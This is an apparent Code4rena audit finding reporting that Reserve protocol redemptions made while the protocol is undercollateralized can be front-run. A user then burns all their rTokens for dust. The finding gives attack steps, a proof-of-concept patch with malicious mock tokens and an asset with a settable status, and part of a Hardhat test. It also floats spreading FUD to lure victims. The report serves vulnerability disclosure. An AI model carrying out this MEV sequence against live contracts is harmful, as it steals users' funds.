## Tags

- bug
- 2 (Med Risk)
- downgraded by judge
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- M-04

# [Redemptions during undercollateralization can be hot-swapped to steal all funds](https://github.com/code-423n4/2023-01-reserve-findings/issues/399) 

# Lines of code

https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/p1/RToken.sol#L420


# Vulnerability details

## Impact
During recollateralization/a switch basket/when the protocol collateral isn't sound, a user can have almost their entire redemption transaction hot swapped for nothing. 

For example, trying to redeem 1M collateral for 1M rTokens could have the user end up with 0 collateral and 0 rTokens, just by calling the `redeem` function at the wrong time. 

Example:
- User A issues 1M rToken for 1M tokenA
- Evil user sees tokenA is about to become disabled, and that User A sent a normally innocuous redeem tx for too much underlying collateral in the mempool

- Evil user orders transactions so they and RSR/Rtoken holders can steal user A's funds

- They first buy a ton of tokenA and send it to the backing Manager
- They call `manageTokens` which flash issues a ton of new Rtoken due to the inflated tokenA balance, increasing the totalSupply
- The increase in total supply allows the normal redemption cap to be drastically lifted
- They then let the disabling of tokenA process, and calls refreshBasket where a backup token (tokenB) kicks in
- We are now undercollateralized, and evil user sends tokenB dust to the backingmanager

- FINALLY: the original redemption TX is ordered, and due to the inflated RToken supply, the battery discharge amount is also inflated, allowing the redemption to go through. Due to the new collateral in place, they redeem ALL their Rtoken (1M) for dust of tokenB!! The protocol has essentially honeypotted them!!

## Proof of Concept
We provide the proof of code in [proof of code](#proof-of-code). 

1. MEV

This relies on a validator being malicious with for-profit motives. It would be pretty easy for them to setup a bot looking for this exact scenario though and just staying dormant till the time is right. If they get to order the transactions, they can make a fat profit from the victim. 

2. Backing manager can flash issue RToken

If the backingManger has too many excess assets, it will flash issue as [many RTokens as](https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/p1/BackingManager.sol#L201) possible to even the collateral to RTokens.

```
function handoutExcessAssets(IERC20[] calldata erc20s) private {
.
.
if (held.gt(needed)) {
.
.
rToken.mint(address(this), uint256(rTok));
```

3. Increasing the supply increases the redemption and issuance block cap

The RedemptionBattery's currentCharge function is [dependent on the total supply of RTokens](https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/libraries/RedemptionBattery.sol#L59). So if the total supply is raised, you can redeem way more than you should be able to.

```
uint256 amtPerHour = (supply * battery.scalingRedemptionRate) / FIX_ONE_256;
```

(This also is true for issuance.)

4. Anyone can call [refreshBasket when a collateral](https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/p1/BasketHandler.sol#L179) is disabled

```
function refreshBasket() external {
        assetRegistry.refresh();

        require(
            main.hasRole(OWNER, _msgSender()) ||
                (status() == CollateralStatus.DISABLED && !main.pausedOrFrozen()),
            "basket unrefreshable"
        );
        _switchBasket();
    }
```

So if I see a tx where a collateral is about to be disabled, I can chain it with the refreshbasket TX myself.

5. Redemptions can occur when protocol is undercollateralized

The `redeem` function has this check:

```
require(basketHandler.status() != CollateralStatus.DISABLED, "collateral default");
```

Which checks if the collateral is good, but NOT if the protocol is fullyCollateralized. Since we chain the disabled asset with the refreshBasket TX, the backup collateral kicks in, and the collateral status becomes `SOUND`. However, normally, we'd have 0 of the new collateral and any redemptions would fail, since there isn't anything to give back.

6. Sending dust to backing manager

So, if you send a tiny tiny bit of the new collateral to the protocol, the protocol will process the redemption and give them their `prorata` share of the collateral, which right now is almost 0, but still burn all the rToken being redeemed.

[RToken.sol](https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/p1/RToken.sol#L475)
```
// amount is never changed, they burn all the rToken
// in our example above, all 1M Rtoken are burned!
_burn(redeemer, amount);
```
And we calculate how much they get back like so. We see how much $ we currently have in the basket, and hand back those amounts accordingly. Since we have almost no money, we are going to give them almost nothing for their rTokens. 
```
(address[] memory erc20s, uint256[] memory amounts) = basketHandler.quote(baskets, FLOOR);
uint256 erc20length = erc20s.length;
// Bound each withdrawal by the prorata share, in case we're currently under-collateralized
        for (uint256 i = 0; i < erc20length; ++i) {
            // {qTok}
            uint256 bal = IERC20Upgradeable(erc20s[i]).balanceOf(address(backingManager));

            // gas-optimization: only do the full mulDiv256 if prorate is 0
            uint256 prorata = (prorate > 0)
                ? (prorate * bal) / FIX_ONE // {qTok} = D18{1} * {qTok} / D18
                : mulDiv256(bal, amount, supply); // {qTok} = {qTok} * {qRTok} / {qRTok}

            if (prorata < amounts[i]) amounts[i] = prorata;
        }
```

And just like that, a seemingly innocuous redemption transaction was a trap the whole time. The next step would be to go through the rest of the process to see how much our evil user profited (from running the auctions), as they need to be a whale to inflate the RToken supply. However, we've seen attacks like this, and one could consider it a [highly profitable trading strategy](https://twitter.com/avi_eisen/status/1581326197241180160?s=20&t=8WpEg76bW_Kk8YaJ5orP5Q). If they buy up majority shares in the RToken, or, they coordinate with most of the StRSR token holders they could advertise and honey pot people to do redemptions whenever a switchBasket is coming. Spread FUD like "you need to redeem otherwise you'll lose money!" and it's the redeeming that actually steals their money. 

## Tools Used

Hardhat

## Recommended Mitigation Steps

Disallow issuance/redemptions while the protocol is undercollateralized. 

## Proof Of Code
To run:
1. git clone https://github.com/reserve-protocol/protocol.git
2. cd protocol
3. Copy paste the below code to a file like `/tmp/changes.patch`
4. git apply /tmp/changes.patch
5. yarn
6. yarn hardhat test test/mev-redemption.ts

```
diff --git a/contracts/ShitAsset.sol b/contracts/ShitAsset.sol
new file mode 100644
index 00000000..5420e914
--- /dev/null
+++ b/contracts/ShitAsset.sol
@@ -0,0 +1,222 @@
+// SPDX-License-Identifier: BlueOak-1.0.0
+pragma solidity 0.8.9;
+
+import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";
+import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
+import "./plugins/assets/OracleLib.sol";
+import "hardhat/console.sol";
+
+contract ShitAsset {
+    using FixLib for uint192;
+    using OracleLib for AggregatorV3Interface;
+
+    // AggregatorV3Interface public immutable chainlinkFeed; // {UoA/tok}
+
+    IERC20Metadata private s_erc20;
+    bool revertErc20 = false;
+
+    CollateralStatus myStatus;
+
+    uint8 public immutable erc20Decimals;
+
+    uint192 public immutable maxTradeVolume; // {UoA}
+
+    uint48 public immutable oracleTimeout; // {s} Seconds that an oracle value is considered valid
+
+    // uint192 public immutable oracleError; // {1} The max % deviation allowed by the oracle
+
+    // === Lot price ===
+
+    uint48 public immutable priceTimeout; // {s} The period over which `savedHighPrice` decays to 0
+
+    uint192 public savedLowPrice; // {UoA/tok} The low price of the token during the last update
+
+    uint192 public savedHighPrice; // {UoA/tok} The high price of the token during the last update
+
+    uint48 public lastSave; // {s} The timestamp when prices were last saved
+
+    string public name;
+
+    /// @param priceTimeout_ {s} The number of seconds over which savedHighPrice decays to 0
+    /// @param chainlinkFeed_ Feed units: {UoA/tok}
+    /// @param oracleError_ {1} The % the oracle feed can be off by
+    /// @param maxTradeVolume_ {UoA} The max trade volume, in UoA
+    /// @param oracleTimeout_ {s} The number of seconds until a oracle value becomes invalid
+    constructor(
+        uint48 priceTimeout_,
+        AggregatorV3Interface chainlinkFeed_,
+        uint192 oracleError_, // @follow-up , this can change
+        IERC20Metadata erc20_,
+        uint192 maxTradeVolume_,
+        uint48 oracleTimeout_
+    ) {
+        require(priceTimeout_ > 0, "price timeout zero");
+        require(address(chainlinkFeed_) != address(0), "missing chainlink feed");
+        require(oracleError_ > 0 && oracleError_ < FIX_ONE, "oracle error out of range");
+        require(address(erc20_) != address(0), "missing erc20");
+        require(maxTradeVolume_ > 0, "invalid max trade volume");
+        require(oracleTimeout_ > 0, "oracleTimeout zero");
+        priceTimeout = priceTimeout_;
+        // chainlinkFeed = chainlinkFeed_;
+        // oracleError = oracleError_;
+        s_erc20 = erc20_;
+        // erc20 = IERC20Metadata(0x000000000000000000000000000000000000dEaD);
+        erc20Decimals = s_erc20.decimals();
+        maxTradeVolume = maxTradeVolume_;
+        oracleTimeout = oracleTimeout_;
+        myStatus = CollateralStatus.SOUND;
+        savedLowPrice = 0;
+        savedHighPrice = 0;
+    }
+
+    function updateErc20(address newErc20) public {
+        if (newErc20 == address(0)) {
+            revertErc20 = true;
+        }
+        s_erc20 = IERC20Metadata(newErc20);
+    }
+
+    /// Can revert, used by other contract functions in order to catch errors
+    /// Should not return FIX_MAX for low
+    /// Should only return FIX_MAX for high if low is 0
+    /// @dev The third (unused) variable is only here for compatibility with Collateral
+    /// @param low {UoA/tok} The low price estimate
+    /// @param high {UoA/tok} The high price estimate
+    function tryPrice() external view virtual returns (uint192 low, uint192 high, uint192) {
+        // uint192 p = chainlinkFeed.price(oracleTimeout); // {UoA/tok}
+        // uint192 delta = p.mul(oracleError);
+        // return (p - delta, p + delta, 0);
+        return (savedLowPrice, savedHighPrice, uint192(0));
+    }
+
+    function updatePrice(uint192 low, uint192 high) public {
+        savedLowPrice = uint192(low);
+        savedHighPrice = uint192(high);
+        lastSave = uint48(block.timestamp);
+    }
+
+    /// Should not revert
+    /// Refresh saved prices
+    function refresh() public virtual {
+        // // @follow-up
+        // // wonder if you could make this more gas efficient returning _?
+        // try this.tryPrice() returns (uint192 low, uint192 high, uint192) {
+        //     // {UoA/tok}, {UoA/tok}
+        //     // (0, 0) is a valid price; (0, FIX_MAX) is unpriced
+        //     // Save prices if priced
+        //     if (high < FIX_MAX) {
+        //         savedLowPrice = low;
+        //         savedHighPrice = high;
+        //         lastSave = uint48(block.timestamp);
+        //     } else {
+        //         // must be unpriced
+        //         // @follow-up
+        //         // @pat why not revert here?
+        //         assert(low == 0);
+        //     }
+        // } catch (bytes memory errData) {
+        //     // see: docs/solidity-style.md#Catching-Empty-Data
+        //     // @follow-up their docs should be updated, they no longer apply to this...
+        //     // Why are they not being marked to iffy here?
+        //     if (errData.length == 0) revert(); // solhint-disable-line reason-string
+        // }
+    }
+
+    // Should not revert
+    //@dev Should be general enough to not need to be overridden
+    // @return {UoA/tok} The lower end of the price estimate
+    // @return {UoA/tok} The upper end of the price estimate
+    function price() public view virtual returns (uint192, uint192) {
+        try this.tryPrice() returns (uint192 low, uint192 high, uint192) {
+            assert(low <= high);
+            return (low, high);
+        } catch (bytes memory errData) {
+            // see: docs/solidity-style.md#Catching-Empty-Data
+            if (errData.length == 0) revert(); // solhint-disable-line reason-string
+            return (0, FIX_MAX);
+        }
+    }
+
+    // Should not revert
+    // lotLow should be nonzero when the asset might be worth selling
+    // @dev Should be general enough to not need to be overridden
+    // @return lotHigh {UoA/tok} The upper end of the lot price estimate
+    function lotPrice() external view virtual returns (uint192 lotLow, uint192 lotHigh) {
+        try this.tryPrice() returns (uint192 low, uint192 high, uint192) {
+            // if the price feed is still functioning, use that
+            lotLow = low;
+            lotHigh = high;
+        } catch (bytes memory errData) {
+            // see: docs/solidity-style.md#Catching-Empty-Data
+            if (errData.length == 0) revert(); // solhint-disable-line reason-string
+
+            // if the price feed is broken, use a decayed historical value
+
+            uint48 delta = uint48(block.timestamp) - lastSave; // {s}
+            if (delta >= priceTimeout) return (0, 0); // no price after timeout elapses
+
+            // {1} = {s} / {s}
+            uint192 lotMultiplier = divuu(priceTimeout - delta, priceTimeout);
+
+            // {UoA/tok} = {UoA/tok} * {1}
+            lotLow = savedLowPrice.mul(lotMultiplier);
+            lotHigh = savedHighPrice.mul(lotMultiplier);
+        }
+        assert(lotLow <= lotHigh);
+    }
+
+    // @return {tok} The balance of the ERC20 in whole tokens
+    function bal(address account) external view returns (uint192) {
+        return shiftl_toFix(s_erc20.balanceOf(account), -int8(erc20Decimals));
+    }
+
+    function isCollateral() external pure virtual returns (bool) {
+        return true;
+    }
+
+    // solhint-disable no-empty-blocks
+
+    /// Claim rewards earned by holding a balance of the ERC20 token
+    /// @dev Use delegatecall
+    function claimRewards() external virtual {}
+
+    // solhint-enable no-empty-blocks
+    enum CollateralStatus {
+        SOUND,
+        IFFY, // When a peg is not holding or a chainlink feed is stale
+        DISABLED // When the collateral has completely defaulted
+    }
+
+    function updateStatus(CollateralStatus newStatus) public {
+        myStatus = newStatus;
+    }
+
+    // collateral stuff
+    function status() public view returns (CollateralStatus) {
+        return myStatus;
+    }
+
+    function updateName(string memory newName) public {
+        name = newName;
+    }
+
+    function targetName() public view returns (bytes32) {
+        // this is "shit" in hex
+        return 0x7368697400000000000000000000000000000000000000000000000000000000;
+    }
+
+    function targetPerRef() public view returns (uint192) {
+        return FIX_ONE;
+    }
+
+    function refPerTok() public view returns (uint192) {
+        return FIX_ONE;
+    }
+
+    function erc20() public view returns (IERC20Metadata) {
+        if (revertErc20) {
+            revert("revertErc20");
+        }
+        return s_erc20;
+    }
+}
diff --git a/contracts/facade/PatrickFacadeWrite.sol b/contracts/facade/PatrickFacadeWrite.sol
new file mode 100644
index 00000000..72be7d3a
--- /dev/null
+++ b/contracts/facade/PatrickFacadeWrite.sol
@@ -0,0 +1,214 @@
+// SPDX-License-Identifier: BlueOak-1.0.0
+pragma solidity 0.8.9;
+
+import "../interfaces/IFacadeWrite.sol";
+import "./lib/FacadeWriteLib.sol";
+import "hardhat/console.sol";
+
+/**
+ * @title FacadeWrite
+ * @notice A UX-friendly layer to interact with the protocol
+ * @dev Under the hood, uses two external libs to deal with blocksize limits.
+ */
+contract PatrickFacadeWrite is IFacadeWrite {
+    using FacadeWriteLib for address;
+
+    IDeployer public immutable deployer;
+
+    constructor(IDeployer deployer_) {
+        require(address(deployer_) != address(0), "invalid address");
+        deployer = deployer_;
+    }
+
+    /// Step 1
+    function deployRToken(
+        ConfigurationParams calldata config,
+        SetupParams calldata setup
+    ) external returns (address) {
+        // Perform validations
+        require(setup.primaryBasket.length > 0, "no collateral");
+        require(setup.primaryBasket.length == setup.weights.length, "invalid length");
+
+        // Validate backups
+        for (uint256 i = 0; i < setup.backups.length; ++i) {
+            require(setup.backups[i].backupCollateral.length > 0, "no backup collateral");
+        }
+
+        // Validate beneficiaries
+        for (uint256 i = 0; i < setup.beneficiaries.length; ++i) {
+            require(
+                setup.beneficiaries[i].beneficiary != address(0) &&
+                    (setup.beneficiaries[i].revShare.rTokenDist > 0 ||
+                        setup.beneficiaries[i].revShare.rsrDist > 0),
+                "beneficiary revShare mismatch"
+            );
+        }
+
+        // Deploy contracts
+        IRToken rToken = IRToken(
+            deployer.deploy(
+                config.name,
+                config.symbol,
+                config.mandate,
+                address(this), // set as owner
+                config.params
+            )
+        );
+
+        // Get Main
+        IMain main = rToken.main();
+        IAssetRegistry assetRegistry = main.assetRegistry();
+        IBackingManager backingManager = main.backingManager();
+        IBasketHandler basketHandler = main.basketHandler();
+
+        // Register assets
+        for (uint256 i = 0; i < setup.assets.length; ++i) {
+            require(assetRegistry.register(setup.assets[i]), "duplicate asset");
+            backingManager.grantRTokenAllowance(setup.assets[i].erc20());
+        }
+
+        // Setup basket
+        {
+            IERC20[] memory basketERC20s = new IERC20[](setup.primaryBasket.length);
+
+            // Register collateral
+            for (uint256 i = 0; i < setup.primaryBasket.length; ++i) {
+                // require(assetRegistry.register(setup.primaryBasket[i]), "duplicate collateral");
+                assetRegistry.register(setup.primaryBasket[i]);
+                IERC20 erc20 = setup.primaryBasket[i].erc20();
+
+                basketERC20s[i] = erc20;
+                backingManager.grantRTokenAllowance(erc20);
+            }
+
+            // Set basket
+
+            // can't issue without setting and call ing refresh
+            basketHandler.setPrimeBasket(basketERC20s, setup.weights);
+            basketHandler.refreshBasket();
+        }
+
+        // Setup backup config
+        {
+            for (uint256 i = 0; i < setup.backups.length; ++i) {
+                IERC20[] memory backupERC20s = new IERC20[](
+                    setup.backups[i].backupCollateral.length
+                );
+
+                for (uint256 j = 0; j < setup.backups[i].backupCollateral.length; ++j) {
+                    ICollateral backupColl = setup.backups[i].backupCollateral[j];
+                    assetRegistry.register(backupColl); // do not require the asset is new
+                    IERC20 erc20 = backupColl.erc20();
+                    backupERC20s[j] = erc20;
+                    backingManager.grantRTokenAllowance(erc20);
+                }
+
+                basketHandler.setBackupConfig(
+                    setup.backups[i].backupUnit,
+                    setup.backups[i].diversityFactor,
+                    backupERC20s
+                );
+            }
+        }
+
+        // // Setup revshare beneficiaries
+        // for (uint256 i = 0; i < setup.beneficiaries.length; ++i) {
+        //     main.distributor().setDistribution(
+        //         setup.beneficiaries[i].beneficiary,
+        //         setup.beneficiaries[i].revShare
+        //     );
+        // }
+
+        // // Pause until setupGovernance
+        // main.pause();
+
+        // // Setup deployer as owner to complete next step - do not renounce roles yet
+        main.grantRole(OWNER, msg.sender);
+
+        // Return rToken address
+        return address(rToken);
+    }
+
+    /// Step 2
+    /// @return newOwner The address of the new owner
+    function setupGovernance(
+        IRToken rToken,
+        bool deployGovernance,
+        bool unpause,
+        GovernanceParams calldata govParams,
+        address owner,
+        address guardian,
+        address pauser
+    ) external returns (address newOwner) {
+        // Get Main
+        IMain main = rToken.main();
+
+        require(main.hasRole(OWNER, address(this)), "ownership already transferred");
+        require(main.hasRole(OWNER, msg.sender), "not initial deployer");
+
+        // Remove ownership to sender
+        main.revokeRole(OWNER, msg.sender);
+
+        if (deployGovernance) {
+            require(owner == address(0), "owner should be empty");
+
+            TimelockController timelock = new TimelockController(
+                govParams.timelockDelay,
+                new address[](0),
+                new address[](0)
+            );
+
+            // Deploy Governance contract
+            address governance = FacadeWriteLib.deployGovernance(
+                IStRSRVotes(address(main.stRSR())),
+                timelock,
+                govParams.votingDelay,
+                govParams.votingPeriod,
+                govParams.proposalThresholdAsMicroPercent,
+                govParams.quorumPercent
+            );
+            emit GovernanceCreated(rToken, governance, address(timelock));
+
+            // Setup Roles
+            timelock.grantRole(timelock.PROPOSER_ROLE(), governance); // Gov only proposer
+            timelock.grantRole(timelock.CANCELLER_ROLE(), guardian); // Guardian as canceller
+            timelock.grantRole(timelock.EXECUTOR_ROLE(), address(0)); // Anyone as executor
+            timelock.revokeRole(timelock.TIMELOCK_ADMIN_ROLE(), address(this)); // Revoke admin role
+
+            // Set new owner to timelock
+            newOwner = address(timelock);
+        } else {
+            require(owner != address(0), "owner not defined");
+            newOwner = owner;
+        }
+
+        // Setup guardian as freeze starter / extender + pauser
+        if (guardian != address(0)) {
+            // As a further decentralization step it is suggested to further differentiate between
+            // these two roles. But this is what will make sense for simple system setup.
+            main.grantRole(SHORT_FREEZER, guardian);
+            main.grantRole(LONG_FREEZER, guardian);
+            main.grantRole(PAUSER, guardian);
+        }
+
+        // Setup Pauser
+        if (pauser != address(0)) {
+            main.grantRole(PAUSER, pauser);
+        }
+
+        // Unpause if required
+        if (unpause) {
+            main.unpause();
+        }
+
+        // Transfer Ownership and renounce roles
+        main.grantRole(OWNER, newOwner);
+        main.grantRole(SHORT_FREEZER, newOwner);
+        main.grantRole(LONG_FREEZER, newOwner);
+        main.grantRole(PAUSER, newOwner);
+        main.renounceRole(OWNER, address(this));
+        main.renounceRole(SHORT_FREEZER, address(this));
+        main.renounceRole(LONG_FREEZER, address(this));
+        main.renounceRole(PAUSER, address(this));
+    }
+}
diff --git a/contracts/p1/mixins/RecollateralizationLib.sol b/contracts/p1/mixins/RecollateralizationLib.sol
index 648d1813..ed058a0d 100644
--- a/contracts/p1/mixins/RecollateralizationLib.sol
+++ b/contracts/p1/mixins/RecollateralizationLib.sol
@@ -435,14 +435,11 @@ library RecollateralizationLibP1 {
 
         // accumulate shortfall
         for (uint256 i = 0; i < len; ++i) {
-            uint192 q = components.bh.quantity(basketERC20s[i]);
-            if (q == 0) continue; // can happen if current basket is out of sync with registry
+            ICollateral coll = components.reg.toColl(basketERC20s[i]);
 
             // {tok} = {BU} * {tok/BU}
             // needed: quantity of erc20 needed for `basketsTop` BUs
-            uint192 needed = basketsTop.mul(q, CEIL); // {tok}
-
-            ICollateral coll = components.reg.toColl(basketERC20s[i]);
+            uint192 needed = basketsTop.mul(components.bh.quantity(basketERC20s[i]), CEIL); // {tok}
 
             // held: quantity of erc20 owned by the bm (BackingManager)
             uint192 held = coll.bal(address(components.bm)); // {tok}
diff --git a/contracts/plugins/assets/FiatCollateral.sol b/contracts/plugins/assets/FiatCollateral.sol
index 600f5a78..d49d1292 100644
--- a/contracts/plugins/assets/FiatCollateral.sol
+++ b/contracts/plugins/assets/FiatCollateral.sol
@@ -60,7 +60,9 @@ contract FiatCollateral is ICollateral, Asset {
     uint192 public prevReferencePrice; // previous rate, {ref/tok}
 
     /// @param config.chainlinkFeed Feed units: {UoA/ref}
-    constructor(CollateralConfig memory config)
+    constructor(
+        CollateralConfig memory config
+    )
         Asset(
             config.priceTimeout,
             config.chainlinkFeed,
@@ -99,11 +101,7 @@ contract FiatCollateral is ICollateral, Asset {
         view
         virtual
         override
-        returns (
-            uint192 low,
-            uint192 high,
-            uint192 pegPrice
-        )
+        returns (uint192 low, uint192 high, uint192 pegPrice)
     {
         pegPrice = chainlinkFeed.price(oracleTimeout); // {target/ref}
 
@@ -220,4 +218,9 @@ contract FiatCollateral is ICollateral, Asset {
     function isCollateral() external pure virtual override(Asset, IAsset) returns (bool) {
         return true;
     }
+
+    // Helper function for testing
+    function setStatus(CollateralStatus newStatus) public {
+        markStatus(newStatus);
+    }
 }
diff --git a/contracts/plugins/mocks/DoubleEntryToken.sol b/contracts/plugins/mocks/DoubleEntryToken.sol
new file mode 100644
index 00000000..01b5d57e
--- /dev/null
+++ b/contracts/plugins/mocks/DoubleEntryToken.sol
@@ -0,0 +1,33 @@
+// SPDX-License-Identifier: BlueOak-1.0.0
+pragma solidity 0.8.9;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "./MaliciousToken.sol";
+
+contract DoubleEntryToken {
+    address public s_tokenToForward;
+    MaliciousToken public s_token;
+
+    function decimals() public view returns (uint8) {
+        return s_token.decimals();
+    }
+
+    constructor(address tokenToForward) {
+        s_tokenToForward = tokenToForward;
+        s_token = MaliciousToken(tokenToForward);
+    }
+
+    function balanceOf(address account) public view returns (uint256) {
+        return s_token.balanceOf(account);
+    }
+
+    function transfer(address recipient, uint256 amount) public returns (bool) {
+        s_token.forwarderTransferFrom(msg.sender, recipient, amount);
+        return true;
+    }
+
+    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
+        s_token.forwarderTransferFrom(from, to, amount);
+        return true;
+    }
+}
diff --git a/contracts/plugins/mocks/MaliciousToken.sol b/contracts/plugins/mocks/MaliciousToken.sol
new file mode 100644
index 00000000..2d0d2209
--- /dev/null
+++ b/contracts/plugins/mocks/MaliciousToken.sol
@@ -0,0 +1,30 @@
+// SPDX-License-Identifier: BlueOak-1.0.0
+pragma solidity 0.8.9;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+contract MaliciousToken is ERC20 {
+    // solhint-disable-next-line no-empty-blocks
+    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
+
+    function forwarderTransferFrom(
+        address from,
+        address to,
+        uint256 amount
+    ) external returns (bool) {
+        _transfer(from, to, amount);
+        return true;
+    }
+
+    function mint(address recipient, uint256 amount) external {
+        _mint(recipient, amount);
+    }
+
+    function burn(address sender, uint256 amount) external {
+        _burn(sender, amount);
+    }
+
+    function adminApprove(address owner, address spender, uint256 amount) external {
+        _approve(owner, spender, amount);
+    }
+}
diff --git a/test/mev-redemption.ts b/test/mev-redemption.ts
new file mode 100644
index 00000000..2bb51649
--- /dev/null
+++ b/test/mev-redemption.ts
@@ -0,0 +1,525 @@
+import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers'
+import { expect } from 'chai'
+import { BigNumber, ContractFactory, Wallet } from 'ethers'
+import { ethers, waffle } from 'hardhat'
+import {
+    IConfig,
+    IGovParams,
+    IRevenueShare,
+    IRTokenConfig,
+    IRTokenSetup,
+} from '../common/configuration'
+import {
+    CollateralStatus,
+    SHORT_FREEZER,
+    LONG_FREEZER,
+    MAX_UINT256,
+    OWNER,
+    PAUSER,
+    ZERO_ADDRESS,
+    BN_SCALE_FACTOR,
+} from '../common/constants'
+import { expectInIndirectReceipt, expectInReceipt } from '../common/events'
+import { bn, fp, divCeil, toBNDecimals } from '../common/numbers'
+import { expectPrice, setOraclePrice } from './utils/oracles'
+import { advanceTime, advanceBlocks, getLatestBlockNumber } from './utils/time'
+import snapshotGasCost from './utils/snapshotGasCost'
+import {
+    Asset,
+    CTokenFiatCollateral,
+    CTokenMock,
+    ERC20Mock,
+    IBasketHandler,
+    FacadeRead,
+    FacadeTest,
+    FacadeWrite,
+    PatrickFacadeWrite,
+    FiatCollateral,
+    Governance,
+    IAssetRegistry,
+    RTokenAsset,
+    TestIBackingManager,
+    TestIBroker,
+    TestIDeployer,
+    TestIDistributor,
+    TestIFurnace,
+    TestIMain,
+    TestIRevenueTrader,
+    TestIStRSR,
+    TestIRToken,
+    TimelockController,
+    USDCMock,
+    ShitAsset,
+    DoubleEntryToken,
+    MaliciousToken,
+    MockV3Aggregator,
+    GnosisMock,
+
+} from '../typechain'
+import {
+    Collateral,
+    Implementation,
+    IMPLEMENTATION,
+    defaultFixture,
+    ORACLE_ERROR,
+    PRICE_TIMEOUT,
+    ORACLE_TIMEOUT
+} from './fixtures'
+import { useEnv } from '#/utils/env'
+
+
+const createFixtureLoader = waffle.createFixtureLoader
+
+const describeGas =
+    IMPLEMENTATION == Implementation.P1 && useEnv('REPORT_GAS') ? describe : describe.skip
+
+describe('FacadeWrite contract', () => {
+    let deployerUser: SignerWithAddress
+    let owner: SignerWithAddress
+    let addr1: SignerWithAddress
+    let addr2: SignerWithAddress
+    let addr3: SignerWithAddress
+    let beneficiary1: SignerWithAddress
+    let beneficiary2: SignerWithAddress
+
+    // RSR
+    let rsr: ERC20Mock
+    let rsrAsset: Asset
+
+    // Tokens
+    let token: ERC20Mock
+    let usdc: USDCMock
+    let cToken: CTokenMock
+    let basket: Collateral[]
+
+    // Aave / Comp
+    let compToken: ERC20Mock
+    let shitToken: ERC20Mock
+    let shitToken2: ERC20Mock
+
+    // Assets
+    let tokenAsset: FiatCollateral
+    let usdcAsset: FiatCollateral
+    let cTokenAsset: CTokenFiatCollateral
+    let shitAsset: ShitAsset
+    let notSoShitAsset: ShitAsset
+    let rTokenAsset: RTokenAsset
+    let compAsset: Asset
+
+    // Trading
+    let gnosis: GnosisMock
+
+    // Config
+    let config: IConfig
+
+    // Deployer
+    let deployer: TestIDeployer
+
+    // Governor
+    let governor: Governance
+    let timelock: TimelockController
+
+    // Facade
+    let facade: FacadeRead
+    let facadeTest: FacadeTest
+    let collateralArray: Collateral[]
+    let facadeWriteLibAddr: string
+
+    // Core contracts
+    let main: TestIMain
+    let assetRegistry: IAssetRegistry
+    let backingManager: TestIBackingManager
+    let basketHandler: IBasketHandler
+    let broker: TestIBroker
+    let distributor: TestIDistributor
+    let furnace: TestIFurnace
+    let rToken: TestIRToken
+    let rTokenTrader: TestIRevenueTrader
+    let rsrTrader: TestIRevenueTrader
+    let stRSR: TestIStRSR
+
+    let facadeWrite: PatrickFacadeWrite
+    let facadeRead: FacadeRead
+    let rTokenConfig: IRTokenConfig
+    let rTokenSetup: IRTokenSetup
+    let badBackupRTokenSetup: IRTokenSetup
+    let govParams: IGovParams
+
+    let revShare1: IRevenueShare
+    let revShare2: IRevenueShare
+
+    let loadFixture: ReturnType<typeof createFixtureLoader>
+    let wallet: Wallet
+
+    let stkWithdrawalDelay: string
+
+
+    const toMinBuyAmt = async (
+        sellAmt: BigNumber,
+        sellPrice: BigNumber,
+        buyPrice: BigNumber
+    ): Promise<BigNumber> => {
+        // do all muls first so we don't round unnecessarily
+        // a = loss due to max trade slippage
+        // b = loss due to selling token at the low price
+        // c = loss due to buying token at the high price
+        // mirrors the math from TradeLib ~L:57
+
+        const lowSellPrice = sellPrice.sub(sellPrice.mul(ORACLE_ERROR).div(BN_SCALE_FACTOR))
+        const highBuyPrice = buyPrice.add(buyPrice.mul(ORACLE_ERROR).div(BN_SCALE_FACTOR))
+        const product = sellAmt
+            .mul(fp('1').sub(await backingManager.maxTradeSlippage())) // (a)
+            .mul(lowSellPrice) // (b)
+
+        return divCeil(divCeil(product, highBuyPrice), fp('1')) // (c)
+    }
+
+    let MockV3AggregatorFactory: ContractFactory
+    let ERC20Factory: ContractFactory
+
+
+    before('create fixture loader', async () => {
+        ;[wallet] = (await ethers.getSigners()) as unknown as Wallet[]
+        loadFixture = createFixtureLoader([wallet])
+    })
+
+    beforeEach(async () => {
+        ;[deployerUser, owner, addr1, addr2, addr3, beneficiary1, beneficiary2] = await ethers.getSigners()
+            // Deploy fixture
+            ; ({ rsr, compToken, gnosis, compAsset, basket, config, facade, facadeTest, deployer, collateral: collateralArray } =
+                await loadFixture(defaultFixture))
+        // config.maxTradeSlippage = fp('0.49') // slippage whatever so we have fewer auctions to do
+        // config.rTokenMaxTradeVolume = fp('1e9') // $1B
+        MockV3AggregatorFactory = await ethers.getContractFactory(
+            'MockV3Aggregator'
+        )
+        const compChainlinkFeed: MockV3Aggregator = <MockV3Aggregator>(
+            await MockV3AggregatorFactory.deploy(8, bn('1e8'))
+        )
+        const ERC20: ContractFactory = await ethers.getContractFactory('ERC20Mock')
+        shitToken = <ERC20Mock>await ERC20.deploy('shitToken Token', 'SHIT')
+        shitToken2 = <ERC20Mock>await ERC20.deploy('shitToken Token', 'SHIT')
+
+        const ShitAssetFactory: ContractFactory = await ethers.getContractFactory('ShitAsset')
+        shitAsset = <ShitAsset>(
+            await ShitAssetFactory.deploy(
+                PRICE_TIMEOUT,
+                compChainlinkFeed.address,
+                ORACLE_ERROR,
+                shitToken.address,
+                config.rTokenMaxTradeVolume,
+                ORACLE_TIMEOUT
+            )
+        )
+        await shitAsset.refresh()
+
+        notSoShitAsset = <ShitAsset>(
+            await ShitAssetFactory.deploy(
+                PRICE_TIMEOUT,
